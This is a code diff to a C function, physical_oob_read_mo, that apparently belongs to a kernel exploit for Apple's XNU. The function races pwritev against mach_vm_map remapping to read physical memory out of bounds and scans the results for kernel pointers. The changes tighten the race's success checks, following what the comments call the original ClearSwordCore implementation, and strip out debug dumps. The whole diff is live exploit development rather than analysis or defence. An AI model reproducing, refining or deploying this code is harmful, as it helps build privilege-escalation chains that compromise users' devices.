@@ -44,7 +44,12 @@ kern_return_t physical_oob_read_mo(mach_port_t mo, mach_vm_offset_t mo_offset, u
     bool read_race_succeeded = false;
     ssize_t w = 0;
 
-    for (uint64_t try_idx = 0; try_idx < 20; try_idx++) {
+    // V25: OG (ClearSwordCore cs2_oob_read) gates restored. The V41/V44 port
+    // dropped the w==-1 gate and scanned the FULL window for non-marker words,
+    // so our own marker backfill manufactured ~6000 "hits" with one unique Q0.
+    // OG: only an EFAULT staging copy (w==-1) whose read-back differs from the
+    // marker AT Q0 counts as an OOB read win.
+    for (uint64_t try_idx = 0; try_idx < (g_ctx.highiest_success_idx + 100); try_idx++) {
         if ((try_idx & 0x3f) == 0 && cs_expired()) {
             LOG_ERR("physical_oob_read_mo: deadline hit, bailing");
             return KERN_FAILURE;
@@ -52,7 +57,7 @@ kern_return_t physical_oob_read_mo(mach_port_t mo, mach_vm_offset_t mo_offset, u
         atomic_store_explicit(&g_ctx.shared->race_sync, 1, memory_order_seq_cst);
         w = pwritev(g_ctx.read_fd, &g_ctx.iov, 1, 0x3f00);
         while (atomic_load_explicit(&g_ctx.shared->race_sync, memory_order_seq_cst) == 1);
-        
+
         mach_vm_address_t map_addr = g_ctx.pc_address;
         kern_return_t kr =
             mach_vm_map(mach_task_self(), &map_addr, g_ctx.pc_size, 0, VM_FLAGS_FIXED | VM_FLAGS_OVERWRITE, g_ctx.pc_object, 0, false, VM_PROT_DEFAULT, VM_PROT_DEFAULT, VM_INHERIT_NONE);
@@ -61,37 +66,11 @@ kern_return_t physical_oob_read_mo(mach_port_t mo, mach_vm_offset_t mo_offset, u
             return KERN_FAILURE;
         }
 
-        pread(g_ctx.read_fd, buffer, size, 0x3f00 + offset);
-        
-        for (int i = 0; i < (int)size; i += 8) {
-            uint64_t val = *(uint64_t*)(buffer + i);
-            if (val != g_ctx.random_marker) {
-                uint64_t q0 = *(uint64_t*)(buffer + 0);
-                uint64_t q1 = *(uint64_t*)(buffer + 8);
-                uint64_t q_last = *(uint64_t*)(buffer + size - 8);
-                // V44 FIX: Only log when Q0 changes to prevent log truncation
-                static uint64_t last_q0 = 0;
-                static uint64_t hit_count = 0;
-                static uint64_t unique_q0_count = 0;
-
-                hit_count++;
-                if (q0 != last_q0) {
-                    unique_q0_count++;
-                    LOG("RACE HIT #%llu (unique #%llu) at try %llu off=%d q0=0x%llx q1=0x%llx q-1=0x%llx",
-                        hit_count, unique_q0_count, try_idx, i, q0, q1, q_last);
-                    LOG("=== OOB DATA DUMP (first 256 bytes) ===");
-                    for (int j = 0; j < 256; j += 16) {
-                        LOG("  %04x: %016llx %016llx", j, *(uint64_t*)(buffer + j), *(uint64_t*)(buffer + j + 8));
-                    }
-                    LOG("=== END DUMP ===");
-                    last_q0 = q0;
-                }
-                LOG("=== END DUMP ===");
-                // V44: Log summary at end
-                LOG("phys_oob: total hits=%llu unique Q0 values=%llu", hit_count, unique_q0_count);
-                if ((val >> 36) == 0xfffffff0ULL) {
-                    LOG("KERNEL POINTER HIT at try %llu, offset %d: 0x%llx", try_idx, i, val);
-                }
+        if (w == -1) {
+            pread(g_ctx.read_fd, buffer, size, 0x3f00 + offset);
+            uint64_t marker = 0;
+            memcpy(&marker, buffer, sizeof(marker));
+            if (marker != g_ctx.random_marker) {
                 read_race_succeeded = true;
                 g_ctx.success_read_count += 1;
                 if (try_idx > g_ctx.highiest_success_idx) {
@@ -99,13 +78,10 @@ kern_return_t physical_oob_read_mo(mach_port_t mo, mach_vm_offset_t mo_offset, u
                 }
                 break;
             }
-        }
-        
-        if (read_race_succeeded) {
-            break;
+            usleep(1);
         }
 
-        usleep(1);
+        if (try_idx == 500) break;
     }
     atomic_store_explicit(&g_ctx.shared->target_object_sync, 0, memory_order_seq_cst);
     return read_race_succeeded ? KERN_SUCCESS : KERN_FAILURE;
